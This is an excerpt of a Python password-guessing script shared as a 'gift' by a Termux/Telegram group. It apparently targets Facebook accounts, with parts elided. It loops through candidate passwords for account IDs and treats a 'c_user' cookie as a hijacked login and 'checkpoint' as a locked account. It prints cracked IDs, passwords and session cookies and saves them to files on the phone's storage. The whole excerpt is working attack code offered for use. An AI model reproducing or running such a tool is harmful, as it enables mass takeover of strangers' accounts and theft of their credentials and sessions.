#=====[========GIFT=========]=============#
#RANDOM CLONE SCRIPT GIFT BY 𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠) TOOLS
#TALEGRAM CHANNEL NANE : MR_𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠) TERMUX COMMUNITY
#GIFT
...
def cyber_1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sMR_𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                ##print('\r\r\033[1;32m[𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)-OK💚] '+uid+'')
                print('\r\r\033[1;32m[𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)-OK💚] ' +cid+ ' | ' +ps+    '  \n[‎‎🔥]\x1b[38;5;254mCOOKIE = \x1b[38;5;46m'+coki+ ' ''  \x1b[38;5;46m')
                open('/sdcard/𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+' | '+uid+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
#              print(f"\x1b[38;5;196m[𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)-CP💔] {uid}|{ps}")
                open('/sdcard/𝗞𝗔𝗟𝗬𝗔𝗡_𝗞𝗜𝗡𝗚(✿◠‿◠)-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
